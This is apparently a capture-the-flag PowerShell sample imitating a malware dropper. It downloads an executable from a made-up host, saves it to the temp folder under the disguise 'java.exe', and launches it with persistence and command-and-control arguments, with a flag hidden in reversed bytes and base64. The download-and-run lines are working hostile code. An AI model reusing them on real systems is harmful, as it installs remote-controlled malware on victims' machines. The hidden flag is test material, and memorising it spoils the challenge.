$url = "http://cyber.mou.flon.s:8000/persist.exe"
$T = [System.IO.Path]::GetTempPath()
$outpath = "$T/java.exe"
Invoke-WebRequest -Uri $url -OutFile $outpath

$weird1 = "GTBQ{b4by_st3"

$weird2 = [byte[]](0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x33, 0x33, 0x77, 0x30, 0x70, 0x5f, 0x6e, 0x31, 0x5f, 0x73, 0x70);
[array]::Reverse($weird2)

$weird2 = [System.Text.Encoding]::UTF8.GetString($weird2)

$weird3 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LVNoM2xsX2RlMGJmdXNjNHQxMG4hfQ=="))

$args = @("-Persist True -cnc c2.cyber.mou.flon.s/init")
Start-Process -Filepath $outpath -ArgumentList $args